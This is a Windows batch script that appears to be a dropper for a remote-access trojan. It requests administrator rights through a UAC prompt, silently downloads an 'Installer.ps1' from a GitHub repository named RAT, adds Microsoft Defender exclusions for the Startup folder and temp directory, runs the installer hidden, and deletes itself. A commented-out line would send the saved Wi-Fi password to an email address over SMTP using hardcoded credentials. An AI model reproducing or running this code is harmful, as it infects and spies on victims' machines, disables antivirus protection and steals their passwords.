@echo off
:: BatchGotAdmin
:: file that gives us admin priv to run and install other files

REM ============================================
REM Check for administrative privileges
REM ============================================

>nul 2>&1 "%SYSTEMROOT%\System32\icacls.exe" "%SYSTEMROOT%\System32\config\system"

IF %ERRORLEVEL% NEQ 0 (
    echo Requesting administrative privileges...
    goto UACPrompt
) ELSE (
    goto gotAdmin
)

REM ============================================
REM UAC Elevation via PowerShell
REM ============================================

:UACPrompt
powershell -NoProfile -Command ^
    "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
exit /B

REM ============================================
REM Running as administrator
REM ============================================

:gotAdmin
pushd "%CD%"
CD /D "%~dp0"

REM ---- your admin-only code goes below here ----
echo Running with administrative privileges.



@REM Email password
@REM powershell -NoProfile -Command "$profile='MyUbuntuAP2'; $line = netsh wlan show profile name=$profile key=clear | Where-Object { $_ -match '^\s*Key Content\s*:' }; $cost = ($line -split ':')[1].Trim(); $email='lukeosullivan123@gmail.com'; $smtpUser='AKIAU2UDJAPS6AGCQU55'; $smtpPass='BBoDj+7tIeYSc9nwA+gmDyR1+tr8sR+EEdqPkX46exSi'; $subject=\"$env:UserName Wifi Psw\"; $msg=New-Object System.Net.Mail.MailMessage; $msg.From=$email; $msg.To.Add($email); $msg.Subject=$subject; $msg.Body = \"Password : $cost\"; $smtp=New-Object System.Net.Mail.SmtpClient('email-smtp.eu-west-1.amazonaws.com',587); $smtp.EnableSsl=$true; $smtp.UseDefaultCredentials=$false; $smtp.DeliveryMethod=[System.Net.Mail.SmtpDeliveryMethod]::Network; $smtp.Credentials=New-Object System.Net.NetworkCredential($smtpUser,$smtpPass); $smtp.Send($msg)"
pause

REM Rat resources
powershell -Command "Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force"
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
powershell powershell.exe -windowstyle hidden -ep bypass ./Installer.ps1
pause
@REM self delete
del wget.cmd